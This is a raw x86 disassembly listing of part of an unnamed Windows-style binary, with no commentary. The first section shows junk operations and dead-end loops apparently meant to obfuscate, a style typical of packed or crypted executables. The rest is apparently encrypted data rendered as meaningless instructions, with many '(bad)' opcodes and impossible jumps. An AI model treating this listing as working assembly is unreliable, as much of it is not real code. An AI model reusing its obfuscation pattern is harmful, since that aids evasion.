  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x430a1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0xfa987a6a
  4125d0:	adc    ebp,DWORD PTR [edi+0x7b7b7318]
  4125d6:	mov    cl,0x9c
  4125d8:	jnp    0x412655
  4125da:	ret    0x570b
  4125dd:	(bad)  
  4125de:	jne    0x41256b
  4125e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125e1:	mov    ds:0x89be3654,al
  4125e6:	add    DWORD PTR [esi-0x24],edx
  4125e9:	jmp    0x4125ed
  4125eb:	std    
  4125ec:	xchg   DWORD PTR [esi-0x3dc4f64e],edx
  4125f2:	push   DWORD PTR [edi]
  4125f4:	(bad)  
  4125f7:	arpl   WORD PTR [ebx-0x5c],si
  4125fa:	sub    eax,0x219a00f0
  4125ff:	sbb    DWORD PTR [eax],ecx
  412601:	add    ecx,esp
  412603:	and    BYTE PTR [ebx+ebx*4+0x12],dl
  412607:	lock int 0x18
  41260a:	jo     0x412682
  41260c:	inc    ebx
  41260d:	jle    0x41265f
  41260f:	(bad)  
  412610:	inc    eax
  412611:	std    
  412612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412614:	shr    BYTE PTR [edx+0x79],cl
  412617:	lock pop ecx
  412619:	push   0x3f
  41261b:	test   al,0x15
  41261d:	icebp  
  41261e:	mov    BYTE PTR [edi-0x68],ch
  412621:	jae    0x4125fc
  412623:	mov    ds:0x33130502,eax
  412628:	xchg   bl,dh
  41262a:	pushf  
  41262b:	addr16 arpl sp,bp
  41262e:	jmp    0x7d2e3569
  412633:	in     al,dx
  412634:	push   ebx
  412635:	cs inc esi
  412637:	rol    edx,1
  412639:	rcr    DWORD PTR [ebx-0x3f528ce8],1
  41263f:	xor    DWORD PTR [esi+edi*4],esp
  412642:	xchg   ebp,eax
  412643:	rcr    BYTE PTR [edx-0x77],cl
  412646:	inc    esi
  412647:	mov    ?,WORD PTR [edx+0x35db00b]
  41264d:	loop   0x4125f5
  41264f:	xchg   esi,eax
  412650:	neg    esi
  412652:	sbb    DWORD PTR [eax],esi
  412654:	sbb    eax,0xed95a161
  412659:	(bad)  
  41265a:	je     0x412647
  41265c:	imul   esi,edx,0x3d01f059
  412662:	dec    esp
  412663:	inc    ebx
  412664:	bound  ecx,QWORD PTR [esi+0xa4498e1]
  41266a:	stc    
  41266b:	adc    BYTE PTR ds:0xebce7a96,0x7c
  412672:	mov    ds:0x1d363173,eax
  412677:	out    dx,al
  412678:	push   esp
  412679:	cmc    
  41267a:	out    dx,eax
  41267b:	pop    ecx
  41267c:	xchg   edx,eax
  41267d:	(bad)  
  41267e:	fistp  WORD PTR [edi+0x4d8f783]
  412684:	imul   edi,ebx,0x1a
  412687:	call   FWORD PTR [ebp+0x735850c9]
  41268d:	adc    cl,BYTE PTR [eax-0x20]
  412690:	in     eax,dx
  412691:	js     0x4126b0
  412693:	mov    ds:0xba05a6c9,al
  412698:	mov    ebp,0x98a43a8
  41269d:	pop    es
  41269e:	sub    DWORD PTR [esi+ebp*4-0x6e],edx
  4126a2:	cmp    ah,bh
  4126a4:	push   cs
  4126a5:	ficom  DWORD PTR [eax-0x72c68275]
  4126ab:	js     0x41267f
  4126ad:	sbb    al,0x49
  4126af:	add    bl,dl
  4126b1:	mov    al,0x71
  4126b3:	dec    eax
  4126b4:	lods   eax,DWORD PTR ds:[esi]
  4126b5:	dec    esp
  4126b6:	test   eax,0x6eab9eb2
  4126bb:	jns    0x412697
  4126bd:	push   ds
  4126be:	bts    DWORD PTR [edx-0x24],edi
  4126c2:	jb     0x4126fa
  4126c4:	mov    ebp,0xed9f0045
  4126c9:	cmp    DWORD PTR [edx],esp
  4126cb:	in     al,dx
  4126cc:	xor    eax,0x39439b73
  4126d1:	test   eax,0x8c75eca
  4126d6:	icebp  
  4126d7:	mov    esi,ebp
  4126d9:	push   ss
  4126da:	jns    0x41274a
  4126dc:	sub    eax,0x95f20803
  4126e1:	jmp    0xa061:0x4ae791c1
  4126e8:	psrad  mm4,QWORD PTR [ecx-0x1e]
  4126ec:	sbb    cl,0xfe
  4126ef:	cmp    BYTE PTR [edi+0x10],dh
  4126f2:	pop    edi
  4126f3:	dec    ecx
  4126f4:	scas   eax,DWORD PTR es:[edi]
  4126f5:	jae    0x412684
  4126f7:	aas    
  4126f8:	push   edi
  4126f9:	fs jmp 0x4126eb
  4126fc:	jecxz  0x412739
  4126fe:	data16 mov bh,0xa1
  412701:	cmp    esi,DWORD PTR [esi]
  412703:	xchg   BYTE PTR [edx-0x5e1359c1],bh
  412709:	in     eax,dx
  41270a:	push   ebp
  41270b:	cs sahf 
  41270d:	(bad)  
  41270e:	mov    cl,0xab
  412710:	iret   
  412711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412712:	data16 lahf 
  412714:	pusha  
  412715:	repnz pushf 
  412717:	sahf   
  412718:	jp     0x4126e3
  41271a:	inc    edx
  41271b:	push   edx
  41271c:	mov    ecx,0xfe3e62f3
  412721:	cmp    BYTE PTR [ecx+0x63],0x14
  412725:	lods   al,BYTE PTR ds:[esi]
  412726:	xchg   edx,eax
  412727:	sti    
  412728:	outs   dx,BYTE PTR ds:[esi]
  412729:	jecxz  0x412787
  41272b:	jbe    0x412726
  41272d:	push   ebp
  41272e:	and    dh,BYTE PTR [edi+0x29]
  412731:	mov    ?,esi
  412733:	(bad)  
  412734:	and    DWORD PTR [esi],esp
  412736:	pop    esi
  412737:	xor    al,0xb
  412739:	mov    esp,0xf5200513
  41273e:	jecxz  0x4126e4
  412740:	aas    
  412741:	jecxz  0x412738
  412743:	fimul  WORD PTR [ecx]
  412745:	cdq    
  412746:	push   ss
  412747:	ja     0x4127a2
  412749:	(bad)  
  41274a:	in     eax,dx
  41274b:	xchg   DWORD PTR [esi],esi
  41274d:	fmul   DWORD PTR [edx-0x37fc6eac]
  412753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412754:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  412756:	into   
  412757:	xchg   esp,eax
  412758:	push   ebp
  412759:	ror    DWORD PTR [edx-0x5347c454],1
  41275f:	xor    DWORD PTR [esi],esp
  412761:	test   BYTE PTR [edx-0x29],bh
  412764:	mov    edx,0x3900045e
  412769:	mov    bl,0x6d
  41276b:	sub    eax,0x43ef1ce4
  412770:	es ret 
  412772:	fisttp QWORD PTR [eax-0x6fb06eab]
  412778:	push   0x7c
  41277a:	mov    eax,0x2fee0042
  41277f:	(bad)  
  412780:	lods   eax,DWORD PTR ds:[esi]
  412781:	inc    ebp
  412782:	pop    eax
  412783:	or     BYTE PTR [ebx-0x80],0x1a
  412787:	std    
  412788:	mov    bl,0xd9
  41278a:	inc    esi
  41278b:	(bad)  
  41278c:	ds mov dl,0xac
  41278f:	test   BYTE PTR [edx+edi*1+0x5c],ch
  412793:	mov    esi,gs
  412795:	(bad)  
  412796:	aad    0x23
  412798:	lahf   
  412799:	inc    esi
  41279a:	adc    al,0x3d
  41279c:	mov    esi,0x24897e73
  4127a1:	popf   
  4127a2:	(bad)  
  4127a4:	out    dx,eax
  4127a5:	sub    DWORD PTR [ebx-0x6ac5c7ed],ebp
  4127ab:	cmc    
  4127ac:	adc    al,0x43
  4127ae:	ret    0x4221
  4127b1:	mul    DWORD PTR [ecx-0x1f]
  4127b4:	xchg   edi,eax
  4127b5:	ss and al,0x52
  4127b8:	test   cl,ah
  4127ba:	push   cs
  4127bb:	mov    BYTE PTR [edx],bh
  4127bd:	loope  0x412807
  4127bf:	sahf   
  4127c0:	xchg   edi,eax
  4127c1:	jbe    0x412837
  4127c3:	fsubr  DWORD PTR [eax+eiz*1-0x7d]
  4127c7:	loope  0x412754
  4127c9:	jmp    0x412765
  4127cb:	sub    al,0x24
  4127cd:	or     DWORD PTR [edx-0x5855bc68],esp
  4127d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d4:	push   edi
  4127d5:	imul   esi,DWORD PTR ds:0xb42bbdaa,0xfffffff0
  4127dc:	mov    edi,DWORD PTR [edi+edx*2]
  4127df:	pop    es
  4127e0:	std    
  4127e1:	data16 loop 0x41283a
  4127e4:	sub    al,0xd0
  4127e6:	jb     0x4127b6
  4127e8:	sub    ebx,DWORD PTR [esi-0x29]
  4127eb:	sbb    eax,0x1f2ef213
  4127f0:	lods   al,BYTE PTR ds:[esi]
  4127f1:	mov    dl,0x90
  4127f3:	aad    0xfb
  4127f5:	aad    0x52
  4127f7:	dec    ecx
  4127f8:	dec    ebp
  4127f9:	push   0xd65047c4
  4127fe:	aam    0xae
  412800:	repnz stc 
  412802:	cwde   
  412803:	mov    edi,0xd363cec0
  412808:	add    bh,bl
  41280a:	retf   
  41280b:	pusha  
  41280c:	(bad)  
  41280d:	mov    dh,0x87
  41280f:	jbe    0x412842
  412811:	adc    eax,DWORD PTR [ebx+eax*8+0x3a]
  412815:	sub    al,0xb8
  412817:	outs   dx,BYTE PTR ds:[esi]
  412818:	mov    ecx,0x340dd80a
  41281d:	imul   ebp,DWORD PTR ds:0x46c1,0xffffffe5
  412823:	loopne 0x4127ff
  412825:	cmp    BYTE PTR [ebp+0x258f318d],bl
  41282b:	inc    eax
  41282c:	mov    ebp,DWORD PTR [ebx+0x40]
  41282f:	ficom  WORD PTR [esi]
  412831:	retf   
  412832:	bound  esp,QWORD PTR [esi+0x4c83929]
  412838:	les    eax,FWORD PTR [ebp+0x66dd340a]
  41283e:	(bad)  [eax+0x21618201]
  412844:	cmp    eax,0x34bc22b0
  412849:	pushf  
  41284a:	scas   al,BYTE PTR es:[edi]
  41284b:	xlat   BYTE PTR ds:[ebx]
  41284c:	fldcw  WORD PTR [eax-0xba82fd8]
  412852:	lea    esi,[edx+0x10]
  412855:	loop   0x4128c1
  412857:	cmp    esi,DWORD PTR [edi+0x680e1334]
  41285d:	cld    
  41285e:	jne    0x41287b
  412860:	or     al,0x40
  412862:	and    al,ch
  412864:	int3   
  412865:	lock push 0x67c3873e
  41286b:	call   0x7aedd081
  412870:	stos   DWORD PTR es:[edi],eax
  412871:	mov    dh,0x15
  412873:	xchg   esi,eax
  412874:	loopne 0x41287d
  412876:	dec    ecx
  412877:	mov    ebp,0x6b1430d6
  41287c:	arpl   WORD PTR [ebx+ebx*2-0x1607c617],ax
  412883:	es cli 
  412885:	and    ebp,DWORD PTR [edi]
  412887:	push   edx
  412888:	push   ss
  412889:	outs   dx,DWORD PTR ds:[esi]
  41288a:	cld    
  41288b:	lods   eax,DWORD PTR ds:[esi]
  41288c:	mov    bh,0xb
  41288e:	pusha  
  41288f:	xor    al,0xa4
  412891:	pop    ds
  412892:	repz lahf 
  412894:	pop    eax
  412895:	add    BYTE PTR [edi-0x3ca06175],0xb1
  41289c:	and    eax,0x52eca1f4
  4128a1:	mov    bh,0x21
  4128a3:	rcl    BYTE PTR [edi+0x68e00dca],1
  4128a9:	scas   eax,DWORD PTR es:[edi]
  4128aa:	adc    eax,0x3f744d48
  4128af:	cld    
  4128b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128b1:	mov    esi,0xcd7ae5ac
  4128b6:	jp     0x412918
  4128b8:	xor    bh,BYTE PTR [edx-0x93148a1]
  4128be:	mov    edx,0xa022053
  4128c3:	push   ecx
  4128c4:	cdq    
  4128c5:	jle    0x412867
  4128c7:	add    bh,bh
  4128c9:	jmp    0xd84a3bbc
  4128ce:	mov    DWORD PTR [edx],edx
  4128d0:	retf   
  4128d1:	pusha  
  4128d2:	xlat   BYTE PTR ds:[ebx]
  4128d3:	sbb    al,0xec
  4128d5:	adc    al,0x2a
  4128d7:	and    dl,BYTE PTR [ebp-0x16d25d6]
  4128dd:	nop
  4128de:	fstp   st(4)
  4128e0:	clc    
  4128e1:	dec    ecx
  4128e2:	mov    al,BYTE PTR [esp+ecx*1+0x1b]
  4128e6:	stos   DWORD PTR es:[edi],eax
  4128e7:	sahf   
  4128e8:	jb     0x41288c
  4128ea:	mov    ch,0x15
  4128ec:	imul   edx,DWORD PTR gs:[edi-0xc9640f5],0xe9da43e4
  4128f7:	mov    dl,0x4b
  4128f9:	fwait
  4128fa:	lahf   
  4128fb:	mov    eax,0x25ab9d89
  412900:	fwait
  412901:	add    bh,BYTE PTR [eax+esi*8-0x40fa4436]
  412908:	adc    bh,BYTE PTR [ebx-0x5a77f8da]
  41290e:	pop    ebp
  41290f:	psubusb mm1,QWORD PTR [ebx-0x45]
  412913:	std    
  412914:	push   ss
  412915:	imul   edi,DWORD PTR [esp+eax*2-0x4f],0x7
  41291a:	jae    0x4128b6
  41291c:	lods   eax,DWORD PTR ds:[esi]
  41291d:	dec    esi
  41291e:	xchg   ebx,eax
  41291f:	adc    al,dl
  412921:	and    al,0xc7
  412923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412924:	inc    ecx
  412925:	(bad)  
  412926:	or     eax,0x5ae920f6
  41292b:	cwde   
  41292c:	xor    eax,0xc59d3882
  412931:	out    dx,al
  412932:	aam    0xb7
  412934:	int3   
  412935:	rcr    BYTE PTR [edi+0x1d],1
  412938:	test   al,0x7d
  41293a:	sub    cl,BYTE PTR [eax-0x57]
  41293d:	adc    al,0xe0
  41293f:	dec    edx
  412940:	mov    BYTE PTR [edx],ah
  412942:	test   DWORD PTR [esi+0x30f30dd6],edi
  412948:	inc    ebx
  412949:	push   edi
  41294a:	fild   WORD PTR [eax+0x46]
  41294d:	push   edi
  41294e:	(bad)  
  41294f:	stos   DWORD PTR es:[edi],eax
  412950:	lahf   
  412951:	pop    ds
  412952:	mov    dh,0x82
  412954:	xchg   edx,eax
  412955:	mov    ch,0x8c
  412957:	add    al,0x70
  412959:	dec    esi
  41295a:	mov    ds:0xd6eb4717,eax
  41295f:	ins    DWORD PTR es:[edi],dx
  412960:	mov    ds,WORD PTR [ebp-0x40175e60]
  412966:	scas   eax,DWORD PTR es:[edi]
  412967:	enter  0xd116,0xe3
  41296b:	xor    eax,0xb1b6ea60
  412970:	add    eax,0xd12de82b
  412975:	int    0x7e
  412977:	inc    esi
  412978:	enter  0xc947,0xc1
  41297c:	out    dx,eax
  41297d:	mov    ebp,0x6733f8f0
  412982:	cmp    DWORD PTR [eax+edi*2+0x62],esi
  412986:	mov    DWORD PTR [ebx+0x21],esp
  412989:	jbe    0x412a0a
  41298b:	xchg   ecx,eax
  41298c:	mov    esi,ds
  41298e:	push   cs
  41298f:	mov    al,ds:0x5aa4948d
  412994:	add    cl,al
  412996:	sub    al,0xaa
  412998:	div    DWORD PTR [edx-0x2d40ccde]
  41299e:	aad    0xb2
  4129a0:	sbb    bh,al
  4129a2:	mov    cl,0x1a
  4129a4:	fld    DWORD PTR [eax-0x4fcceaf9]
  4129aa:	sbb    BYTE PTR [ecx],ch
  4129ac:	sub    BYTE PTR ds:0x14ba3d19,bh
  4129b2:	sahf   
  4129b3:	pushf  
  4129b4:	mov    cl,0x8d
  4129b6:	adc    eax,0x18d3a27e
  4129bb:	mov    ds:0x1094bfe1,al
  4129c0:	mov    BYTE PTR [ebx],al
  4129c2:	xlat   BYTE PTR ds:[ebx]
  4129c3:	xchg   esi,eax
  4129c4:	sub    eax,0x684f2afd
  4129c9:	stc    
  4129ca:	sahf   
  4129cb:	rcl    DWORD PTR ds:0x8c27f07e,0x47
  4129d2:	jae    0x41296e
  4129d4:	jl     0x4129f3
  4129d6:	sar    BYTE PTR [ebx+0x2e],1
  4129d9:	mov    edx,0x31675782
  4129de:	mov    BYTE PTR [esi],dl
  4129e0:	stos   BYTE PTR es:[edi],al
  4129e1:	inc    eax
  4129e2:	jecxz  0x4129b6
  4129e4:	inc    edx
  4129e5:	mov    ebx,0xc0293f7d
  4129ea:	dec    esp
  4129eb:	cwde   
  4129ec:	aad    0x11
  4129ee:	add    eax,0x7392045f
  4129f3:	jnp    0x412a2a
  4129f5:	mov    al,ds:0x282edadf
  4129fa:	inc    esp
  4129fb:	and    BYTE PTR [eax-0x6b],ch
  4129fe:	jmp    0xa9d5:0x4fd6d5ce
  412a05:	div    BYTE PTR ds:[edx]
  412a08:	cmp    dl,0x95
  412a0b:	lds    edi,FWORD PTR [edi]
  412a0d:	lahf   
  412a0e:	popa   
  412a0f:	imul   ecx,DWORD PTR [ebx+0x434fbf70],0xb795e9d9
  412a19:	ss mov dl,0xbc
  412a1c:	pop    ds
  412a1d:	jo     0x412a03
  412a1f:	ret    
  412a20:	dec    esp
  412a21:	sbb    eax,0x49f61bf9
  412a26:	pop    ss
  412a27:	ds dec esi
  412a29:	mov    esp,0x16ba43e5
  412a2e:	shl    ebp,1
  412a30:	inc    ebp
  412a31:	mov    ds:0x55ee0954,al
  412a36:	jae    0x412a4d
  412a38:	sbb    DWORD PTR [edi+ebp*8+0x32],edi
  412a3c:	cmp    BYTE PTR [ebx-0x551bdda8],ah
  412a42:	gs jne 0x4129d6
  412a45:	fdivr  DWORD PTR [eax+0xa]
  412a48:	fs cmp DWORD PTR ss:[esi-0x7c],0xffffff89
  412a4e:	call   DWORD PTR [esi-0x25d2b343]
  412a54:	pusha  
  412a55:	ficom  DWORD PTR [ebx+0x61]
  412a58:	jne    0x412a9f
  412a5a:	and    BYTE PTR [edi+0x351b0ca1],al
  412a60:	shl    DWORD PTR [ecx+eiz*8+0x62],1
  412a64:	das    
  412a65:	mov    edx,0x9ab55f16
  412a6a:	push   esi
  412a6b:	sub    al,0x14
  412a6d:	xor    al,0x2b
  412a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a70:	mov    cl,0x3e
  412a72:	cmp    al,BYTE PTR [esi]
  412a74:	out    0x84,al
  412a76:	pop    es
  412a77:	div    DWORD PTR [eax-0x5]
  412a7a:	shr    BYTE PTR [edx-0xee48662],1
  412a80:	jo     0x412a3c
  412a82:	jmp    0x412a91
  412a84:	aad    0x6a
  412a86:	out    0x24,al
  412a88:	std    
  412a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a8a:	lock pop edx
  412a8c:	sbb    DWORD PTR [ecx+edx*2],esi
  412a8f:	(bad)  
  412a90:	in     al,dx
  412a91:	jae    0x412b07
  412a93:	xchg   esp,eax
  412a94:	in     eax,dx
  412a95:	xchg   edx,eax
  412a96:	pop    esp
  412a97:	cmp    al,0xce
  412a99:	mov    ch,0x3
  412a9b:	(bad)  
  412a9c:	test   ch,0xa
  412a9f:	lock out dx,al
  412aa1:	dec    edi
  412aa2:	mov    ecx,0x82fee884
  412aa7:	ins    BYTE PTR es:[edi],dx
  412aa8:	sub    BYTE PTR [edi+0x6f],bh
  412aab:	imul   esi,DWORD PTR [ebx+0x2d639c30],0xe51c480f
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	mov    bh,0xae
  412ab8:	loop   0x412acf
  412aba:	fisttp QWORD PTR [edx]
  412abc:	jmp    0xeef1:0x2a1c64f9
  412ac3:	add    al,0x47
  412ac5:	sbb    cl,ch
  412ac7:	mov    ch,0x42
  412ac9:	and    DWORD PTR [ecx],ebp
  412acb:	adc    dl,BYTE PTR ds:0x20a7b638
  412ad1:	dec    edx
  412ad2:	stos   DWORD PTR es:[edi],eax
  412ad3:	(bad)  
  412ad4:	in     al,0xf8
  412ad6:	adc    eax,0x48f8ef2c
  412adb:	jmp    0xaf87:0xed72c887
  412ae2:	dec    ebp
  412ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ae4:	mov    esi,DWORD PTR [ecx-0x6]
  412ae7:	sbb    al,0xa2
  412ae9:	add    DWORD PTR [ecx-0x7372c420],esp
  412aef:	mov    eax,DWORD PTR [ebx]
  412af1:	cwde   
  412af2:	cmp    DWORD PTR [ebp+ebx*4+0xc],edi
  412af6:	js     0x412b2a
  412af8:	psrlq  mm1,QWORD PTR [eax-0x2748c6b1]
  412aff:	fnsave [ebx]
  412b01:	inc    edi
  412b02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b03:	and    esi,DWORD PTR [esi+eiz*4-0x669d97ab]
  412b0a:	jecxz  0x412b7d
  412b0c:	test   DWORD PTR [edx],0x696e27e1
  412b12:	out    0x6,eax
  412b14:	mov    esp,DWORD PTR [ebx-0x598bb33a]
  412b1a:	pop    ds
  412b1b:	cwde   
  412b1c:	jno    0x412b0d
  412b1e:	xchg   ecx,eax
  412b1f:	adc    esi,DWORD PTR [edi-0x5d6f9302]
  412b25:	jmp    0x1dd63940
  412b2a:	imul   esi,ebx,0x1b9bb040
  412b30:	lds    esp,FWORD PTR [edx+0x2c704a7e]
  412b36:	loope  0x412af6
  412b38:	xchg   ebp,eax
  412b39:	dec    eax
  412b3a:	pop    edi
  412b3b:	or     edi,DWORD PTR [edi+0x48]
  412b3e:	daa    
  412b3f:	mov    ds:0x592296ef,eax
  412b44:	mov    BYTE PTR [ebx],dh
  412b46:	jp     0x412b5a
  412b48:	xor    edx,ecx
  412b4a:	stos   DWORD PTR es:[edi],eax
  412b4b:	aas    
  412b4c:	stos   DWORD PTR es:[edi],eax
  412b4d:	add    BYTE PTR [edx+0xc],al
  412b50:	rcr    ecx,0x2a
  412b53:	jle    0x412b77
  412b55:	(bad)  
  412b56:	fs dec eax
  412b58:	push   cs
  412b59:	wbinvd 
  412b5b:	push   es
  412b5c:	test   DWORD PTR [ecx-0x1a],eax
  412b5f:	jmp    0x412af1
  412b61:	add    ch,BYTE PTR [edi]
  412b63:	aad    0xfe
